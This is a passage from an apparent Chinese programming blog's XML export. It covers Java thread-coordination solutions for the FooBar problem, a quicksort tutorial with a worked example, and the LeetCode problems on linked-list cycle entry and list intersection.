<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FooBar</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> n;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">FooBar</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.n = n;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    CyclicBarrier cb = <span class="keyword">new</span> CyclicBarrier(<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">volatile</span> <span class="keyword">boolean</span> fin = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">foo</span><span class="params">(Runnable printFoo)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">while</span>(!fin);</span><br><span class="line">            printFoo.run();</span><br><span class="line">            fin = <span class="keyword">false</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">		cb.await();</span><br><span class="line">	    &#125; <span class="keyword">catch</span> (BrokenBarrierException e) &#123;</span><br><span class="line">	    &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">bar</span><span class="params">(Runnable printBar)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">		cb.await();</span><br><span class="line">	    &#125; <span class="keyword">catch</span> (BrokenBarrierException e) &#123;</span><br><span class="line">	    &#125;</span><br><span class="line">            printBar.run();</span><br><span class="line">            fin = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法五："><a href="#解法五：" class="headerlink" title="解法五："></a>解法五：</h3><p>使用Semaphore</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FooBar</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">private</span> Semaphore s1 = <span class="keyword">new</span> Semaphore(<span class="number">0</span>);</span><br><span class="line">		<span class="keyword">private</span> Semaphore s2 = <span class="keyword">new</span> Semaphore(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">private</span> <span class="keyword">int</span> n;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="title">FooBar</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">			<span class="keyword">this</span>.n = n;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">foo</span><span class="params">(Runnable printFoo)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">				<span class="comment">// printFoo.run() outputs "foo". Do not change or remove</span></span><br><span class="line">				<span class="comment">// this</span></span><br><span class="line">				<span class="comment">// line.</span></span><br><span class="line">				s2.acquire();</span><br><span class="line">				printFoo.run();</span><br><span class="line">				s1.release();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">bar</span><span class="params">(Runnable printBar)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">			</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">				<span class="comment">// printBar.run() outputs "bar". Do not change or remove</span></span><br><span class="line">				<span class="comment">// this</span></span><br><span class="line">				<span class="comment">// line.</span></span><br><span class="line">				s1.acquire();</span><br><span class="line">				printBar.run();</span><br><span class="line">				s2.release();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>





]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>多线程</tag>
        <tag>Condition</tag>
        <tag>ReentrantLock</tag>
        <tag>Semaphore</tag>
        <tag>CyclicBarrier</tag>
      </tags>
  </entry>
  <entry>
    <title>快速排序</title>
    <url>/2020/03/31/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%8E%92%E5%BA%8F/2020-03-31-%E6%8E%92%E5%BA%8F-%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h1 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h1><p><strong>快速排序</strong>（英语：Quicksort），又称<strong>划分交换排序</strong>（partition-exchange sort），简称<strong>快排</strong>，一种<a href="https://zh.wikipedia.org/wiki/排序算法" target="_blank" rel="noopener">排序算法</a>，最早由<a href="https://zh.wikipedia.org/wiki/東尼·霍爾" target="_blank" rel="noopener">东尼·霍尔</a>提出。在平均状况下，排序{\displaystyle n}<img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/a601995d55609f2d9f5e233e36fbe9ea26011b3b" alt="n">个项目要<img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/52de01bd6666792cf18fce11c058ae3e67694f02" alt="{\displaystyle \ O(n\log n)}">)（<a href="https://zh.wikipedia.org/wiki/大O符号" target="_blank" rel="noopener">大O符号</a>）次比较。在最坏状况下则需要次比较，但这种状况并不常见。事实上，快速排序通常明显比其他算法更快，因为它的内部循环（inner loop）可以在大部分的架构上很有效率地达成。</p>
<p>快速排序使用<a href="https://zh.wikipedia.org/wiki/分治法" target="_blank" rel="noopener">分治法</a>（Divide and conquer）策略来把一个<a href="https://zh.wikipedia.org/wiki/序列" target="_blank" rel="noopener">序列</a>（list）分为较小和较大的2个子序列，然后递归地排序两个子序列。</p>
<p>步骤为：</p>
<ol>
<li>挑选基准值：从数列中挑出一个元素，称为“基准”（pivot），</li>
<li>分割：重新排序数列，所有比基准值小的元素摆放在基准前面，所有比基准值大的元素摆在基准后面（与基准值相等的数可以到任何一边）。在这个分割结束之后，对基准值的排序就已经完成，</li>
<li>递归排序子序列：<a href="https://zh.wikipedia.org/wiki/递归" target="_blank" rel="noopener">递归</a>地将小于基准值元素的子序列和大于基准值元素的子序列排序。</li>
</ol>
<p>递归到最底部的判断条件是数列的大小是零或一，此时该数列显然已经有序。</p>
<p><img src="https://huhansi.github.io/images/2020-03-03-quickSort.gif" alt="快速排序图示"></p>
<p>选取基准值有数种具体方法，此选取方法对排序的时间性能有决定性影响。</p>
<p>在简单的<a href="https://zh.wikipedia.org/wiki/伪代码" target="_blank" rel="noopener">伪代码</a>中，此算法可以被表示为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function quicksort(q)</span><br><span class="line"> &#123;</span><br><span class="line">     var list less, pivotList, greater</span><br><span class="line">     if length(q) ≤ 1 </span><br><span class="line">         return q</span><br><span class="line">     else </span><br><span class="line">     &#123;</span><br><span class="line">         select a pivot value pivot from q</span><br><span class="line">         for each x in q except the pivot element</span><br><span class="line">         &#123;</span><br><span class="line">             if x &lt; pivot then add x to less</span><br><span class="line">             if x ≥ pivot then add x to greater</span><br><span class="line">         &#125;</span><br><span class="line">         add pivot to pivotList</span><br><span class="line">         return concatenate(quicksort(less), pivotList, quicksort(greater))</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<h2 id="原地分割版本"><a href="#原地分割版本" class="headerlink" title="原地分割版本"></a>原地分割版本</h2><p>上面简单版本的缺点是，它需要的额外存储空间，也就跟<a href="https://zh.wikipedia.org/wiki/归并排序" target="_blank" rel="noopener">归并排序</a>一样不好。额外需要的<a href="https://zh.wikipedia.org/wiki/記憶體" target="_blank" rel="noopener">存储器</a>空间配置，在实际上的实现，也会极度影响速度和<a href="https://zh.wikipedia.org/wiki/快取" target="_blank" rel="noopener">缓存</a>的性能。有一个比较复杂使用<a href="https://zh.wikipedia.org/wiki/原地算法" target="_blank" rel="noopener">原地</a>（in-place）分割<a href="https://zh.wikipedia.org/wiki/算法" target="_blank" rel="noopener">算法</a>的版本，且在好的基准选择上，平均可以达到<img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/aae0f22048ba6b7c05dbae17b056bfa16e21807d" alt="{\displaystyle O(\log n)}">空间的使用复杂度。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function partition(a, left, right, pivotIndex)</span><br><span class="line"> &#123;</span><br><span class="line">     pivotValue &#x3D; a[pivotIndex]</span><br><span class="line">     swap(a[pivotIndex], a[right]) &#x2F;&#x2F; 把pivot移到結尾</span><br><span class="line">     storeIndex &#x3D; left</span><br><span class="line">     for i from left to right-1</span><br><span class="line">     &#123;</span><br><span class="line">         if a[i] &lt;&#x3D; pivotValue</span><br><span class="line">          &#123;</span><br><span class="line">             swap(a[storeIndex], a[i])</span><br><span class="line">             storeIndex &#x3D; storeIndex + 1</span><br><span class="line">          &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     swap(a[right], a[storeIndex]) &#x2F;&#x2F; 把pivot移到它最後的地方</span><br><span class="line">     return storeIndex</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>这是原地分割算法，它分割了标示为”左边（left）”和”右边（right）”的序列部分，借由移动小于<code>a[pivotIndex]</code>的所有元素到子序列的开头，留下所有大于或等于的元素接在他们后面。在这个过程它也为基准元素找寻最后摆放的位置，也就是它回传的值。它暂时地把基准元素移到子序列的结尾，而不会被前述方式影响到。由于算法只使用交换，因此最后的数列与原先的数列拥有一样的元素。要注意的是，一个元素在到达它的最后位置前，可能会被交换很多次。</p>
<p>一旦我们有了这个分割算法，要写快速排列本身就很容易：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">procedure quicksort(a, left, right)</span><br><span class="line">    if right &gt; left</span><br><span class="line">        select a pivot value a[pivotIndex]</span><br><span class="line">        pivotNewIndex :&#x3D; partition(a, left, right, pivotIndex)</span><br><span class="line">        quicksort(a, left, pivotNewIndex-1)</span><br><span class="line">        quicksort(a, pivotNewIndex+1, right)</span><br></pre></td></tr></table></figure>

<h2 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h2><p>下面以一个实际的例子说明。</p>
<p>以 47、29、71、99、78、19、24、47 的待排序的数列为例进行排序，为了方便区分两个 47，我们对后面的 47 增加一个下画线，即待排序的数列为 47、29、71、99、78、19、24、<u>47</u>。</p>
<p>首先我们需要在数列中选择一个基准数，我们一般会选择中间的一个数或者头尾的数，这里直接选择第 1 个数 47 作为基准数，接着把比 47 小的数字移动到左边，把比 47 大的数字移动到右边，对于相等的数字不做移动。所以实际上我们需要找到中间的某个位置 k，这样 k 左边的值全部比 k 上的值小，k 右边的值全部比 k 上的值大。</p>
<p>接下来开始移动元素。怎么移动呢？其实冒泡排序也涉及对元素的移动，但是那样移动起来很累，比如把最后一个元素移动到第 1 个，就需要比较 n-1 次，同时交换 n-1 次，效率很低。其实，只需把第 1 个元素和最后一个元素交换就好了，这种思想是不是在排序时可以借鉴呢？之前说快速排序就是对冒泡排序的一个改进，就是这个原因。</p>
<p>快速排序的操作是这样的：首先从数列的右边开始往左边找，我们设这个下标为 i，也就是进行减减操作（i–），找到第 1 个比基准数小的值，让它与基准值交换；接着从左边开始往右边找，设这个下标为 j，然后执行加加操作（j++），找到第 1 个比基准数大的值，让它与基准值交换；然后继续寻找，直到 i 与 j 相遇时结束，最后基准值所在的位置即 k 的位置，也就是说 k 左边的值均比 k 上的值小，而 k 右边的值都比 k 上的值大。</p>
<p>所以对于上面的数列 47、29、71、99、78、19、24、<u>47</u>，进行第 1 趟第 1 个交换的排序情况如下，第 1 次的操作情况如下图所示。</p>
<p><img src="https://huhansi.github.io/images/2020-03-31-kuaipai1.jpg" alt="第一次交换后"></p>
<p>交换之后，j 移动到了下标为 6 的位置，对 i 继续扫描：</p>
<p><img src="https://huhansi.github.io/images/2020-03-31-kuaipai2.jpg" alt="第一次交换后"></p>
<p>此时交换后的数列变为 24、29、47、99、78、19、71、<u>47</u>。接下来我们继续对 i、j 进行操作，如图 3 所示，继续进行 i– 及 j++ 的比较操作：</p>
<p><img src="https://huhansi.github.io/images/2020-03-31-kuaipai3.jpg" alt="第一次交换后"></p>
<p>进行了这两次 i、j 的移动、比较、交换之后，我们最终得到的数列是 24、29、19、47、78、99、71、<u>47</u>。接下来我们继续进行 i– 的操作，发现在 i 为 4 时比 47 大不用交换，在 i 为 3 时与 j 相遇，这时就不需要继续移动、比较了，已经找到 k 了，并且 k 的值为 3。我们可以确认一下当前的数列是不是 k 左边的值都比 47 小，而 k 右边的值都比 47 大（由于要保持相对位置不变，所以 47 同样在基准值 47 的右边）。</p>
<p>47 这个值已经落到了它该在的位置，第 1 趟排序完成了。接下来就是以 k 为基准，分为两部分，然后在左右两部分分别执行上述排序操作，最后数据会分为 4 部分；接着对每部分进行操作，直到每部分都只有一个值为止。</p>
<p>接下来进行第 2 趟排序，现在左边部分为 24、29、19，我们选择第 1 个数 24 作为基准数，接着进行 i–、j++ 的操作，我们发现 i 最初的值为 19，比 24 这个基准值小，所以与基准值进行交换，得到的数列为 19、29、24；当 j 为 1 时，我们发现 29 比 24 大，所以与基准值进行交换，得到的数列 19、24、29，此时 i 为 2，j 为 1；继续 i– 时发现 i 为 1，与 j 相遇，左边部分的数列的 k 为 1，并且左右两部分分别只有一个元素，此时第 2 轮排序的左边部分的排序结束，同时左边部分的所有数据都排序完成。</p>
<p>我们接着看右边部分的排序，待排序的数列为 78、99、71、<u>47</u>，我们同样选择第 1 个值 78 为基准值，接下来进行 i 与 j 的移动与比较，发现 <u>47</u> 比 78 小，进行交换，得到的数列 47、99、71、78；从左往右发现 99 比基准值 78 大，进行交换，得到的数列为 <u>47</u>、78、71、99；继续从右向左看，发现 71 比基准值 78 小，进行交换，得到的数列为 <u>47</u>、71、78、99。此时 i 在整体<a href="http://data.biancheng.net/view/181.html" target="_blank" rel="noopener">数组</a>中的下标为 6，j 为 5，若继续 j++ 则与 i 相遇，所以完成此轮排序。</p>
<p>此时右边数列的 k 为 6，一般会是相遇的位置，也就是基准值所在的位置，这时数列又被分为两部分，左边是 <u>47</u>、71，右边是 99，需要继续对左边部分的数据进行排序，虽然只有两个数据，但我们还是继续按照快速排序的思想操作一下，选择 <u>47</u> 作为基准数，将i进行从右向左的移动、比较，发现 i 与 j 相等时没有产生移动，完成第 2 轮排序。</p>
<p>至此，所有排序都已经完成，最终数列的结果是 19、24、29、47、47、71、78、99，怎么样，快速排序是不是非常简单地完成了所有的排序呢？虽然本次快速排序没有改变相同值的元素的顺序，但是由于快速排序需要对数列中的元素来回移动，有时还是会改变相对顺序的（比如 47 在第 1 轮的移动过程中就被移动到 <u>47</u> 的右边了），所以快速排序并不是一个稳定的算法。</p>
<h2 id="快速排序实现"><a href="#快速排序实现" class="headerlink" title="快速排序实现"></a>快速排序实现</h2><h3 id="实现一：递归"><a href="#实现一：递归" class="headerlink" title="实现一：递归"></a>实现一：递归</h3><h4 id="java"><a href="#java" class="headerlink" title="java"></a>java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] sortArray(<span class="keyword">int</span>[] nums) &#123;</span><br><span class="line">        quickSort(nums, <span class="number">0</span>, nums.length - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> nums;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">partition</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> left, <span class="keyword">int</span> right)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> pivot = nums[left];</span><br><span class="line">        <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">            <span class="keyword">while</span> (left &lt; right &amp;&amp; nums[right] &gt;= pivot) &#123;</span><br><span class="line">                right--;</span><br><span class="line">            &#125;</span><br><span class="line">            nums[left] = nums[right];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> (left &lt; right &amp;&amp; nums[left] &lt;= pivot) &#123;</span><br><span class="line">                left++;</span><br><span class="line">            &#125;</span><br><span class="line">            nums[right] = nums[left];</span><br><span class="line">        &#125;</span><br><span class="line">        nums[left] = pivot;</span><br><span class="line">        <span class="keyword">return</span> left;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">quickSort</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> left, <span class="keyword">int</span> right)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (left &lt; right) &#123;</span><br><span class="line">            <span class="keyword">int</span> index = partition(nums, left, right);</span><br><span class="line">            quickSort(nums, left, index - <span class="number">1</span>);</span><br><span class="line">            quickSort(nums, index + <span class="number">1</span>, right);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="[https://zh.wikipedia.org/wiki/%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F](https://zh.wikipedia.org/wiki/快速排序)">维基百科-快速排序</a></p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>排序</tag>
        <tag>快速排序</tag>
      </tags>
  </entry>
  <entry>
    <title>Java/多线程/2020-03-29-Cy和CountDownLatch以及Semaphore</title>
    <url>/2020/03/28/Java/%E5%A4%9A%E7%BA%BF%E7%A8%8B/2020-03-29-Cy%E5%92%8CCountDownLatch%E4%BB%A5%E5%8F%8ASemaphore/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>Java/Java基础/2020-03-29-JDK中的设计模式</title>
    <url>/2020/03/28/Java/Java%E5%9F%BA%E7%A1%80/2020-03-29-JDK%E4%B8%AD%E7%9A%84%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>142.环形链表 II</title>
    <url>/2020/03/28/LeetCode/leetcode-000142.%E7%8E%AF%E5%BD%A2%E9%93%BE%E8%A1%A8%20II/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个链表，返回链表开始入环的第一个节点。 如果链表无环，则返回 null。</p>
<p>为了表示给定链表中的环，我们使用整数 pos 来表示链表尾连接到链表中的位置（索引从 0 开始）。 如果 pos 是 -1，则在该链表中没有环。</p>
<h2 id="说明："><a href="#说明：" class="headerlink" title="说明："></a>说明：</h2><p>不允许修改给定的链表。</p>
<h2 id="示例1"><a href="#示例1" class="headerlink" title="示例1"></a>示例1</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入：head = [<span class="number">3</span>,<span class="number">2</span>,<span class="number">0</span>,-<span class="number">4</span>], pos = <span class="number">1</span></span><br><span class="line">输出：<span class="keyword">true</span></span><br><span class="line">解释：链表中有一个环，其尾部连接到第二个节点。</span><br></pre></td></tr></table></figure>

<p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/07/circularlinkedlist.png" alt></p>
<h2 id="示例2"><a href="#示例2" class="headerlink" title="示例2"></a>示例2</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入：head = [<span class="number">1</span>,<span class="number">2</span>], pos = <span class="number">0</span></span><br><span class="line">输出：<span class="keyword">true</span></span><br><span class="line">解释：链表中有一个环，其尾部连接到第一个节点。</span><br></pre></td></tr></table></figure>

<p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/07/circularlinkedlist_test2.png" alt></p>
<h2 id="示例3"><a href="#示例3" class="headerlink" title="示例3"></a>示例3</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入：head = [<span class="number">1</span>], pos = -<span class="number">1</span></span><br><span class="line">输出：<span class="keyword">false</span></span><br><span class="line">解释：链表中没有环。</span><br></pre></td></tr></table></figure>

<p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/07/circularlinkedlist_test3.png" alt></p>
<h2 id="进阶："><a href="#进阶：" class="headerlink" title="进阶："></a>进阶：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">你是否可以不用额外空间解决此题？</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一：Floyd-算法"><a href="#解法一：Floyd-算法" class="headerlink" title="解法一：Floyd 算法"></a>解法一：Floyd 算法</h3><p>Floyd 的算法被划分成两个不同的 <em>阶段</em> 。在第一阶段，找出列表中是否有环，如果没有环，可以直接返回 <code>null</code> 并退出。否则，用 <code>相遇节点</code> 来找到环的入口。</p>
<p>首先我们初始化额外的两个指针： ptr1 ，指向链表的头， ptr2 指向相遇点。然后，我们每次将它们往前移动一步，直到它们相遇，它们相遇的点就是环的入口，返回这个节点。</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">detectCycle</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">		ListNode slow = head;</span><br><span class="line">		ListNode fast = head;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span> (fast == <span class="keyword">null</span> || fast.next == <span class="keyword">null</span>) &#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			slow = slow.next;</span><br><span class="line"></span><br><span class="line">			fast = fast.next.next;</span><br><span class="line">			<span class="keyword">if</span> (fast == slow) &#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		slow = head;</span><br><span class="line">		<span class="keyword">while</span> (slow != fast) &#123;</span><br><span class="line">			slow = slow.next;</span><br><span class="line">			fast = fast.next;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> slow;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法二：借助HashSet"><a href="#解法二：借助HashSet" class="headerlink" title="解法二：借助HashSet"></a>解法二：借助HashSet</h3><p>如果我们用一个 <code>Set</code> 保存已经访问过的节点，我们可以遍历整个列表并返回第一个出现重复的节点。</p>
<h4 id="Java-1"><a href="#Java-1" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">detectCycle</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">        Set&lt;ListNode&gt; visited = <span class="keyword">new</span> HashSet&lt;ListNode&gt;();</span><br><span class="line"></span><br><span class="line">        ListNode node = head;</span><br><span class="line">        <span class="keyword">while</span> (node != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (visited.contains(node)) &#123;</span><br><span class="line">                <span class="keyword">return</span> node;</span><br><span class="line">            &#125;</span><br><span class="line">            visited.add(node);</span><br><span class="line">            node = node.next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>链表</tag>
      </tags>
  </entry>
  <entry>
    <title>160.相交链表</title>
    <url>/2020/03/28/LeetCode/leetcode-000160-%E7%9B%B8%E4%BA%A4%E9%93%BE%E8%A1%A8/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>编写一个程序，找到两个单链表相交的起始节点。</p>
<p>如下面的两个链表<strong>：</strong></p>
<p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/14/160_statement.png" alt></p>
<p>在节点 c1 开始相交.</p>
<h2 id="示例1"><a href="#示例1" class="headerlink" title="示例1"></a>示例1</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入：intersectVal = <span class="number">8</span>, listA = [<span class="number">4</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">5</span>], listB = [<span class="number">5</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">5</span>], skipA = <span class="number">2</span>, skipB = <span class="number">3</span></span><br><span class="line">输出：Reference of the node with value = <span class="number">8</span></span><br><span class="line">输入解释：相交节点的值为 <span class="number">8</span> （注意，如果两个列表相交则不能为 <span class="number">0</span>）。从各自的表头开始算起，链表 A 为 [<span class="number">4</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">5</span>]，链表 B 为 [<span class="number">5</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">5</span>]。在 A 中，相交节点前有 <span class="number">2</span> 个节点；在 B 中，相交节点前有 <span class="number">3</span> 个节点。</span><br></pre></td></tr></table></figure>

<p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/14/160_example_1.png" alt></p>
<h2 id="示例2"><a href="#示例2" class="headerlink" title="示例2"></a>示例2</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入：intersectVal = <span class="number">2</span>, listA = [<span class="number">0</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>], listB = [<span class="number">3</span>,<span class="number">2</span>,<span class="number">4</span>], skipA = <span class="number">3</span>, skipB = <span class="number">1</span></span><br><span class="line">输出：Reference of the node with value = <span class="number">2</span></span><br><span class="line">输入解释：相交节点的值为 <span class="number">2</span> （注意，如果两个列表相交则不能为 <span class="number">0</span>）。从各自的表头开始算起，链表 A 为 [<span class="number">0</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>]，链表 B 为 [<span class="number">3</span>,<span class="number">2</span>,<span class="number">4</span>]。在 A 中，相交节点前有 <span class="number">3</span> 个节点；在 B 中，相交节点前有 <span class="number">1</span> 个节点。</span><br></pre></td></tr></table></figure>

<p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/14/160_example_2.png" alt></p>
<h2 id="示例3"><a href="#示例3" class="headerlink" title="示例3"></a>示例3</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入：intersectVal = <span class="number">0</span>, listA = [<span class="number">2</span>,<span class="number">6</span>,<span class="number">4</span>], listB = [<span class="number">1</span>,<span class="number">5</span>], skipA = <span class="number">3</span>, skipB = <span class="number">2</span></span><br><span class="line">输出：<span class="keyword">null</span></span><br><span class="line">输入解释：从各自的表头开始算起，链表 A 为 [<span class="number">2</span>,<span class="number">6</span>,<span class="number">4</span>]，链表 B 为 [<span class="number">1</span>,<span class="number">5</span>]。由于这两个链表不相交，所以 intersectVal 必须为 <span class="number">0</span>，而 skipA 和 skipB 可以是任意值。</span><br><span class="line">解释：这两个链表不相交，因此返回 <span class="keyword">null</span>。</span><br></pre></td></tr></table></figure>

<p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/14/160_example_3.png" alt></p>
<h2 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h2><ul>
<li>如果两个链表没有交点，返回 null.</li>
<li>在返回结果后，两个链表仍须保持原有的结构。</li>
<li>可假定整个链表结构中没有循环。</li>
<li>程序尽量满足 O(n) 时间复杂度，且仅用 O(1) 内存。</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一：借助HashSet"><a href="#解法一：借助HashSet" class="headerlink" title="解法一：借助HashSet"></a>解法一：借助HashSet</h3><p>遍历其中某一个链表，全放入HashSet中。然后遍历剩下一个链表，第一个在HashSet中出现的链表节点就是交点。</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 借助HashSet</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> headA</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> headB</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> ListNode <span class="title">getIntersectionNode</span><span class="params">(ListNode headA, ListNode headB)</span> </span>&#123;</span><br><span class="line">		HashSet&lt;ListNode&gt; set = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">		<span class="keyword">while</span> (<span class="keyword">null</span> != headA) &#123;</span><br><span class="line">			set.add(headA);</span><br><span class="line">			headA = headA.next;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		